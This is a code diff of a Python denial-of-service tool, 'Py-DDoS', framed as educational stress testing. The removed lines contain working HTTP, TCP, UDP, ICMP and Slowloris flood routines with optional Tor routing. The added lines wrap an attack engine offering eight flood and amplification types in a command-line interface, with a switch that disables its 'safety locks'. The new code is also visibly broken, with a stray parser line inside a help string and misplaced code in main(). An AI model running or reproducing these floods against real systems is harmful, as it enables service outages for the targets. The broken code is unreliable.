@@ -1,331 +1,380 @@
 #!/usr/bin/env python3
 """
-Py-DDoS Simulator - Ethical Cybersecurity Demonstration Tool
+Py-DDoS v7.5 - Operational Network Stress Testing Tool
+For Educational and Authorized Penetration Testing Only
+
 Author: voltsparx
 Contact: voltsparx@gmail.com
 
-WARNING: This tool is designed for educational purposes and ethical security testing only.
-Unauthorized use against any network or system without explicit permission is illegal.
-Use responsibly and only in controlled environments you own or have written permission to test.
+IMPORTANT: This tool includes built-in safety locks by default to prevent
+accidental misuse. Safety locks require confirmation before executing potentially
+high-impact network stress tests. Safety locks can be disabled during configuration.
+
+Usage:
+    Interactive mode:
+        python3 py-ddos.py
+    
+    Command-line mode:
+        python3 py-ddos.py -t target.com -p 80 -a HTTP -d 60 -c 100
+        python3 py-ddos.py --target 192.168.1.1 --port 8080 --attack SLOWLORIS --duration 120
+
+LEGAL DISCLAIMER:
+    This tool is for AUTHORIZED OPERATIONAL TESTING and EDUCATIONAL purposes only.
+    Unauthorized network stress testing is ILLEGAL in most jurisdictions.
+    The author assumes no liability for misuse of this tool.
+
+SAFETY FEATURES:
+    - Built-in safety locks enabled by default
+    - Confirmation prompts for high-impact configurations
+    - Educational notes for learning purposes
+    - Full audit logging of all activities
+    - Can be disabled only with explicit user confirmation
 """
 
-import threading
-import time
-import socket
-import random
+import sys
 import os
-from concurrent.futures import ThreadPoolExecutor
-import requests
-import urllib3
-from urllib3.exceptions import InsecureRequestWarning
-urllib3.disable_warnings(InsecureRequestWarning)
+import argparse
+import signal
 
-# Try to import rich for enhanced UI, fallback to standard if not available
-try:
-    from rich.console import Console
-    from rich.panel import Panel
-    from rich.progress import Progress, BarColumn, TextColumn
-    from rich.table import Table
-    RICH_AVAILABLE = True
-except ImportError:
-    RICH_AVAILABLE = False
+# Add core directory to path
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-class DDoSSimulator:
-    def __init__(self):
-        self.attack_active = False
-        self.attack_type = ""
-        self.target_host = ""
-        self.target_port = 0
-        self.thread_count = 0
-        self.duration = 0
-        self.use_tor = False
-        self.requests_sent = 0
-        self.start_time = 0
-        self.console = Console() if RICH_AVAILABLE else None
+from core.colors import Styles, Colors
+from core.config import Config
+from core.cli_menu import interactive_menu, print_banner
+from core.engine import PyDDoS
+from core.safety_locks import SafetyLocks
+from core.metadata import VERSION, PROJECT_NAME, AUTHOR, CONTACT
 
-    def display_banner(self):
-        banner_text = (
-            "[bold magenta]\n"
-            "╔══════════════════════════════════════════════════════════════╗\n"
-            "║                 Py-DDoS Simulator v2.0                       ║\n"
-            "║                 Ethical Demonstration Tool                   ║\n"
-            "║                                                              ║\n"
-            "║                 Author: voltsparx                            ║\n"
-            "║                 Contact: voltsparx@gmail.com                 ║\n"
-            "╚══════════════════════════════════════════════════════════════╝\n[/bold magenta]"
-        )
-        if RICH_AVAILABLE:
-            self.console.print(Panel(banner_text, style="bold magenta", expand=False))
+
+def create_parser():
+    """Create command-line argument parser with educational help"""
+    
+    # Custom help text with educational notes
+    help_text = """
+Py-DDoS v7.0 - Operational Network Stress Testing Tool
+
+Author: voltsparx | Contact: voltsparx@gmail.com
+
+This tool is designed for:
+  - Learning about network resilience and stress testing
+  - Authorized penetration testing and validation
+  - Security research in controlled environments
+  - Testing incident response procedures
+  - Infrastructure capacity planning
+
+EDUCATIONAL FOCUS:
+  Each network stress test demonstrates a different testing vector:
+  - HTTP: Application-layer volumetric stress tests
+  - SLOWLORIS: Resource exhaustion via slow clients
+  - UDP: Network-layer stress testing
+  - SYN: TCP connection exhaustion scenarios
+  - SLOWREAD: Slow data transmission testing
+  - DNS: Amplification test scenarios
+  - ICMP: Network monitoring protocol testing
+  - NTP: Reflected amplification scenarios
+
+SAFETY FEATURES:
+  - Safety locks enabled by default
+  - Confirmation prompts for high-resource tests
+  - External target warning system
+  - TOR usage acknowledgment prompts
+  - Complete audit logging
+  - Ctrl+C interrupt support during tests
+
+"""
+    
+    parser = argparse.ArgumentParser(
+        prog='py-ddos',
+        description=help_text,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+    parser.add_argument('--test-aiohttp-errors', action='store_true', help='Run aiohttp error handling test suite (developer only)')
+    parser.add_argument('--about', action='store_true', help='Show information about this tool, attacks, credits, and disclaimers')
+EXAMPLES:
+  # Interactive mode with safety locks
+  python3 py-ddos.py
+  
+  # HTTP flood attack
+  python3 py-ddos.py -t example.com -p 80 -a HTTP -d 60 -c 100
+  
+  # Slowloris attack with TOR (requires confirmation)
+  python3 py-ddos.py -t 192.168.1.1 -p 8080 -a SLOWLORIS -d 120 --tor
+  
+  # UDP flood with many threads
+  python3 py-ddos.py --target example.com --attack UDP --duration 300 --threads 500
+  
+  # List all available attacks
+  python3 py-ddos.py -l
+
+EDUCATIONAL NOTES:
+  Understanding DDoS attacks is crucial for:
+  1. Network defense and mitigation strategies
+  2. Incident response and detection
+  3. Infrastructure capacity planning
+  4. Security testing methodologies
+  
+  Each attack type reveals different vulnerabilities:
+  - Application layer (L7): HTTP, SLOWLORIS, SLOWREAD
+  - Transport layer (L4): UDP, SYN, DNS, NTP
+  - Network layer (L3): ICMP
+  
+  Defending against these requires:
+  - Rate limiting and throttling
+  - Geographic distribution
+  - Anycast network routing
+  - Advanced filtering and monitoring
+
+LEGAL NOTICE:
+  Using this tool against systems without explicit written authorization is ILLEGAL
+  and may result in criminal prosecution. Ensure you have:
+  1. Written permission from the system owner
+  2. Documented scope and authorized test window
+  3. Legal compliance in your jurisdiction
+  4. Proper incident response procedures
+
+Author: voltsparx | Contact: voltsparx@gmail.com
+        """
+    )
+    
+    # Target options
+    parser.add_argument('-t', '--target', dest='target', 
+                       help='Target IP address or hostname')
+    parser.add_argument('-p', '--port', dest='port', type=int, default=80, 
+                       help='Target port (default: 80)')
+    
+    # Attack options
+    parser.add_argument('-a', '--attack', dest='attack_type',
+                       choices=['HTTP', 'SLOWLORIS', 'UDP', 'SYN', 'SLOWREAD', 'DNS', 'ICMP', 'NTP'],
+                       help='Attack type (see --help for educational notes)')
+    parser.add_argument('-d', '--duration', dest='duration', type=int, default=60,
+                       help='Attack duration in seconds (default: 60)')
+    parser.add_argument('-c', '--threads', dest='threads', type=int, default=100,
+                       help='Number of worker threads (default: 100)')
+    
+    # Optional features
+    parser.add_argument('--tor', dest='use_tor', action='store_true',
+                       help='Enable TOR anonymity layer (triggers confirmation)')
+    parser.add_argument('--config', dest='config_file',
+                       help='Load configuration from JSON file')
+    parser.add_argument('--save-config', dest='save_config',
+                       help='Save configuration to JSON file after test')
+    parser.add_argument('--no-safety-locks', dest='no_safety', action='store_true',
+                       help='Disable safety locks (requires confirmation)')
+    
+    # Utility options
+    parser.add_argument('-l', '--list-attacks', dest='list_attacks', action='store_true',
+                       help='List all available test scenarios with descriptions')
+    parser.add_argument('--version', action='version', version='Py-DDoS v7.0 - Educational Edition')
+    
+    return parser
+
+
+def list_attacks():
+    """Display all available test scenarios with educational information"""
+    print(Styles.section("AVAILABLE TEST SCENARIOS"))
+    print()
+    
+    for key, attack in Config.ATTACK_TYPES.items():
+        print(f"  {Colors.BRIGHT_YELLOW}[{key}]{Colors.RESET} {Colors.BOLD}{attack['name']:<15}{Colors.RESET}")
+        print(f"      {Colors.CYAN}{attack['description']}{Colors.RESET}")
+        print(f"      Root Required: {Colors.BRIGHT_RED if attack['requires_root'] else Colors.BRIGHT_GREEN}"
+              f"{'Yes' if attack['requires_root'] else 'No'}{Colors.RESET}")
+        print()
+    
+    print()
+    print(Styles.educational_note("NETWORK STRESS TEST CLASSIFICATION",
+"""Network stress test scenarios are classified by OSI layer:
+
+LAYER 7 (Application Layer):
+  - HTTP: Direct application-layer stress testing
+  - SLOWLORIS: Keep-alive header manipulation
+  - SLOWREAD: Slow data transmission
+
+LAYER 4 (Transport Layer):
+  - UDP: User Datagram Protocol stress testing
+  - SYN: TCP connection exhaustion scenarios
+  - DNS: Recursive query amplification testing
+  - NTP: Network Time Protocol reflection testing
+
+LAYER 3 (Network Layer):
+  - ICMP: Internet Control Message Protocol testing
+
+MITIGATION STRATEGIES:
+  1. Rate limiting and throttling
+  2. Geo-redundancy and load balancing
+  3. DDoS scrubbing centers
+  4. BGP flowspec filtering
+  5. Anycast distribution networks
+  6. Advanced traffic analysis and detection"""))
+    
+    print()
+
+
+def main():
+        # About flag: show interactive about prompt
+        if getattr(args, 'about', False):
+            from core.about import about_prompt
+            about_prompt()
+            sys.exit(0)
+    """Main entry point with safety lock integration"""
+    
+    parser = create_parser()
+    args = parser.parse_args()
+
+    # Developer test: run aiohttp error handling test suite
+    if getattr(args, 'test_aiohttp_errors', False):
+        import subprocess
+        import os
+        test_path = os.path.join(os.path.dirname(__file__), 'core', 'test_aiohttp_errors.py')
+        result = subprocess.run([sys.executable, test_path])
+        sys.exit(result.returncode)
+    
+    # Initialize safety locks
+    safety = SafetyLocks()
+    
+    # Check if safety locks should be disabled
+    if args.no_safety:
+        print(Styles.warning("You requested to disable safety locks"))
+        if not safety.disable_locks():
+            sys.exit(1)
+    
+    # Check if no arguments provided
+    if len(sys.argv) == 1:
+        # Interactive mode
+        print_banner()
+        Config.print_disclaimer()
+        print()
+        print(Styles.info("Safety locks are ENABLED by default"))
+        print(Styles.info("You will receive confirmation prompts for high-impact configurations"))
+        print()
+        
+        engine = PyDDoS(use_cli_output=True)
+        config = interactive_menu(engine.is_root)
+        
+        if config:
+            # Run safety checks
+            if not safety.check_all(config):
+                print(Styles.warning("Attack cancelled due to safety checks"))
+                sys.exit(1)
+            
+            engine.run_attack(config)
         else:
-            print(banner_text)
-
-    def display_warning(self):
-        warning_text = (
-            "[bold red]\n"
-            "╔══════════════════════════════════════════════════════════════╗\n"
-            "║                         WARNING                              ║\n"
-            "║══════════════════════════════════════════════════════════════║\n"
-            "║ This tool is for educational and ethical testing purposes    ║\n"
-            "║ only. Unauthorized use against networks you don't own or     ║\n"
-            "║ have explicit permission to test is ILLEGAL.                 ║\n"
-            "║                                                              ║\n"
-            "║ By using this tool, you agree that you are solely            ║\n"
-            "║ responsible for any consequences resulting from its use.     ║\n"
-            "║ The author assumes no liability for misuse of this tool.     ║\n"
-            "╚══════════════════════════════════════════════════════════════╝\n[/bold red]"
-        )
-        if RICH_AVAILABLE:
-            self.console.print(Panel(warning_text, style="bold red", expand=False))
+            print(Styles.error("Attack cancelled"))
+            sys.exit(1)
+    
+    elif args.list_attacks:
+        # List attack types with educational notes
+        list_attacks()
+        sys.exit(0)
+    
+    elif args.target and args.attack_type:
+        # Command-line attack mode
+        print_banner()
+        Config.print_disclaimer()
+        print()
+        
+        # Show safety status
+        if safety.locks_enabled:
+            print(Styles.success("Safety locks: ENABLED"))
+            print(Styles.info("High-impact configurations will require confirmation"))
         else:
-            print(warning_text)
-        input("Press Enter to acknowledge this warning and continue...")
-
-    def configure_tor(self):
-        """Configure Tor proxy settings"""
-        self.use_tor = input("Use Tor for anonymity? (y/n): ").lower() == 'y'
-        if self.use_tor:
-            self.tor_proxy = "socks5://127.0.0.1:9050"
-            print("[+] Tor proxy enabled")
-        else:
-            self.tor_proxy = None
-
-    def get_target_info(self):
-        """Get target information from user"""
-        print("\n" + "="*50)
-        print("TARGET CONFIGURATION")
-        print("="*50)
-
-        self.target_host = input("Target host/IP: ").strip()
-        if self.target_host in ['localhost', '127.0.0.1', '0.0.0.0']:
-            print("[!] Warning: Targeting localhost - make sure you have a test server running")
-
-        print("\nAvailable attack vectors:")
-        print("1. HTTP/HTTPS Flood")
-        print("2. TCP SYN Flood")
-        print("3. UDP Flood")
-        print("4. ICMP Flood (requires admin/root)")
-        print("5. Slowloris (Low-bandwidth attack)")
-
-        choice = input("Select attack type (1-5): ").strip()
-        attack_types = {
-            '1': 'HTTP',
-            '2': 'TCP',
-            '3': 'UDP',
-            '4': 'ICMP',
-            '5': 'SLOWLORIS'
+            print(Styles.danger("Safety locks: DISABLED"))
+            print(Styles.warning("Proceeding without safety confirmations"))
+        print()
+        
+        # Validate target
+        import socket
+        try:
+            resolved_ip = socket.gethostbyname(args.target)
+            print(Styles.success(f"Target resolved: {args.target} -> {resolved_ip}"))
+        except socket.gaierror:
+            try:
+                socket.inet_aton(args.target)
+                resolved_ip = args.target
+            except socket.error:
+                print(Styles.error(f"Invalid target: {args.target}"))
+                sys.exit(1)
+        
+        # Validate attack type
+        attack_info = Config.get_attack_info(args.attack_type.upper())
+        if not attack_info:
+            print(Styles.error(f"Unknown attack type: {args.attack_type}"))
+            sys.exit(1)
+        
+        # Check root requirement
+        engine = PyDDoS(use_cli_output=True)
+        if attack_info['requires_root'] and not engine.is_root:
+            print(Styles.error(f"{args.attack_type} attack requires root/admin privileges"))
+            sys.exit(1)
+        
+        # Build configuration
+        config = {
+            'target_host': resolved_ip,
+            'target_input': args.target,
+            'target_port': args.port,
+            'attack_type': args.attack_type.upper(),
+            'threads': args.threads,
+            'duration': args.duration,
+            'use_tor': args.use_tor or False,
+            'proxies': None
         }
-        self.attack_type = attack_types.get(choice, 'HTTP')
+        
+        # Load config file if specified
+        if args.config_file:
+            print(Styles.info(f"Loading configuration from {args.config_file}"))
+            loaded_config = Config.load_config(args.config_file)
+            config.update(loaded_config)
+        
+        # Display configuration
+        print()
+        print(Styles.section("ATTACK CONFIGURATION"))
+        print()
+        print(Styles.table_row("Target", f"{config['target_input']} ({config['target_host']})"))
+        print(Styles.table_row("Port", str(config['target_port'])))
+        print(Styles.table_row("Attack Type", config['attack_type']))
+        print(Styles.table_row("Threads", str(config['threads'])))
+        print(Styles.table_row("Duration", f"{config['duration']} seconds"))
+        print(Styles.table_row("TOR", "Enabled" if config['use_tor'] else "Disabled"))
+        print()
+        
+        # Run safety checks
+        if not safety.check_all(config):
+            print(Styles.warning("Attack cancelled by safety checks"))
+            sys.exit(1)
+        
+        # Execute attack
+        if engine.run_attack(config):
+            # Save config if requested
+            if args.save_config:
+                Config.save_config(config, args.save_config)
+                print(Styles.success(f"Configuration saved to {args.save_config}"))
+            
+            print(Styles.success("Attack completed successfully"))
+            sys.exit(0)
+        else:
+            print(Styles.error("Attack failed"))
+            sys.exit(1)
+    
+    else:
+        # Missing required arguments
+        from core.help_menu import print_help_menu
+        print_help_menu()
+        print()
+        print(Styles.warning("Missing required arguments for command-line mode"))
+        print(Styles.info("Use: python3 py-ddos.py --help for more information"))
+        sys.exit(1)
 
-        if self.attack_type == 'HTTP':
-            self.target_port = int(input("Target port (80 for HTTP, 443 for HTTPS): ") or "80")
-        elif self.attack_type == 'TCP':
-            self.target_port = int(input("Target port: ") or "80")
-        elif self.attack_type == 'UDP':
-            self.target_port = int(input("Target port: ") or "53")
-        elif self.attack_type == 'ICMP':
-            self.target_port = 0
-        elif self.attack_type == 'SLOWLORIS':
-            self.target_port = int(input("Target port (typically 80): ") or "80")
-
-        self.thread_count = int(input("Number of threads (50-500): ") or "100")
-        self.duration = int(input("Attack duration in seconds (0 for unlimited): ") or "60")
-
-    def http_flood(self):
-        """HTTP/HTTPS flood attack"""
-        url = f"{'https' if self.target_port == 443 else 'http'}://{self.target_host}:{self.target_port}"
-        user_agents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
-        ]
-        session = requests.Session()
-        if self.use_tor:
-            session.proxies = {
-                'http': self.tor_proxy,
-                'https': self.tor_proxy
-            }
-        while self.attack_active:
-            try:
-                headers = {
-                    'User-Agent': random.choice(user_agents),
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.5',
-                    'Connection': 'keep-alive',
-                    'Upgrade-Insecure-Requests': '1'
-                }
-                verify_ssl = False if self.target_port == 443 else True
-                session.get(url, headers=headers, timeout=5, verify=verify_ssl)
-                self.requests_sent += 1
-            except Exception:
-                pass
-
-    def tcp_flood(self):
-        """TCP SYN flood attack"""
-        while self.attack_active:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(1)
-                s.connect((self.target_host, self.target_port))
-                s.send(b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\n\r\n")
-                self.requests_sent += 1
-                s.close()
-            except Exception:
-                pass
-
-    def udp_flood(self):
-        """UDP flood attack"""
-        data = random._urandom(1024)
-        while self.attack_active:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                s.sendto(data, (self.target_host, self.target_port))
-                self.requests_sent += 1
-                s.close()
-            except Exception:
-                pass
-
-    def icmp_flood(self):
-        """ICMP/Ping flood (requires root privileges on Unix systems)"""
-        try:
-            while self.attack_active:
-                if os.name == 'nt':
-                    os.system(f"ping -n 1 -w 1000 {self.target_host} > nul")
-                else:
-                    os.system(f"ping -c 1 -W 1 {self.target_host} > /dev/null 2>&1")
-                self.requests_sent += 1
-        except Exception:
-            print("[!] ICMP flood may require administrator/root privileges")
-
-    def slowloris(self):
-        """Slowloris attack - keeps many connections open"""
-        sockets = []
-        try:
-            for i in range(200):
-                if not self.attack_active:
-                    break
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(2)
-                    s.connect((self.target_host, self.target_port))
-                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
-                    s.send(f"Host: {self.target_host}\r\n".encode())
-                    s.send("User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n".encode())
-                    s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
-                    s.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
-                    s.send("Connection: keep-alive\r\n".encode())
-                    sockets.append(s)
-                except Exception:
-                    break
-            while self.attack_active:
-                for s in sockets[:]:
-                    try:
-                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
-                        self.requests_sent += 1
-                    except Exception:
-                        sockets.remove(s)
-                        try:
-                            s.close()
-                        except Exception:
-                            pass
-                time.sleep(10)
-        finally:
-            for s in sockets:
-                try:
-                    s.close()
-                except Exception:
-                    pass
-
-    def monitor_attack(self):
-        """Display attack statistics in real-time"""
-        start_time = time.time()
-        last_count = 0
-        try:
-            while self.attack_active:
-                elapsed = time.time() - start_time
-                current_count = self.requests_sent
-                requests_per_second = (current_count - last_count)
-                last_count = current_count
-
-                os.system('cls' if os.name == 'nt' else 'clear')
-
-                if RICH_AVAILABLE:
-                    status_table = Table(title="Attack Status", show_header=True, header_style="bold magenta")
-                    status_table.add_column("Metric", style="cyan")
-                    status_table.add_column("Value", style="green")
-                    status_table.add_row("Target", f"{self.target_host}:{self.target_port}")
-                    status_table.add_row("Attack Type", self.attack_type)
-                    status_table.add_row("Threads", str(self.thread_count))
-                    status_table.add_row("Duration", f"{int(elapsed)}s / {self.duration}s" if self.duration > 0 else f"{int(elapsed)}s / Unlimited")
-                    status_table.add_row("Requests Sent", str(self.requests_sent))
-                    status_table.add_row("Req/Sec", f"{requests_per_second:.1f}")
-                    status_table.add_row("Tor", "Enabled" if self.use_tor else "Disabled")
-                    self.console.print(status_table)
-                else:
-                    print(f"Target: {self.target_host}:{self.target_port}")
-                    print(f"Attack Type: {self.attack_type}")
-                    print(f"Threads: {self.thread_count}")
-                    print(f"Duration: {int(elapsed)}s / {self.duration if self.duration > 0 else 'Unlimited'}s")
-                    print(f"Requests Sent: {self.requests_sent}")
-                    print(f"Requests/Sec: {requests_per_second:.1f}")
-                    print(f"Tor: {'Enabled' if self.use_tor else 'Disabled'}")
-
-                if self.duration > 0 and elapsed >= self.duration:
-                    self.attack_active = False
-                    print("\n[+] Attack completed (duration reached)")
-                time.sleep(1)
-        except KeyboardInterrupt:
-            self.attack_active = False
-            print("\n[!] Attack stopped by user")
-
-    def start_attack(self):
-        """Start the DDoS simulation"""
-        self.attack_active = True
-        self.requests_sent = 0
-
-        attack_methods = {
-            'HTTP': self.http_flood,
-            'TCP': self.tcp_flood,
-            'UDP': self.udp_flood,
-            'ICMP': self.icmp_flood,
-            'SLOWLORIS': self.slowloris
-        }
-        attack_method = attack_methods.get(self.attack_type)
-        if not attack_method:
-            print("[!] Invalid attack type selected")
-            return
-
-        print(f"\n[+] Starting {self.attack_type} attack on {self.target_host}:{self.target_port}")
-        print(f"[+] Using {self.thread_count} threads")
-        print(f"[+] Press Ctrl+C to stop the attack\n")
-        time.sleep(2)
-
-        monitor_thread = threading.Thread(target=self.monitor_attack)
-        monitor_thread.daemon = True
-        monitor_thread.start()
-
-        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
-            for _ in range(self.thread_count):
-                executor.submit(attack_method)
-
-        try:
-            while self.attack_active:
-                time.sleep(0.1)
-        except KeyboardInterrupt:
-            self.attack_active = False
-            print("\n[!] Attack stopped by user")
-
-        print("\n[+] Attack finished")
-        print(f"[+] Total requests sent: {self.requests_sent}")
-
-    def run(self):
-        """Main method to run the tool"""
-        self.display_banner()
-        self.display_warning()
-        self.configure_tor()
-        self.get_target_info()
-        self.start_attack()
 
 if __name__ == "__main__":
-    simulator = DDoSSimulator()
-    simulator.run()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print()
+        print(Styles.warning("Attack interrupted by user"))
+        sys.exit(0)
+    except Exception as e:
+        print(Styles.error(f"Unexpected error: {e}"))
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
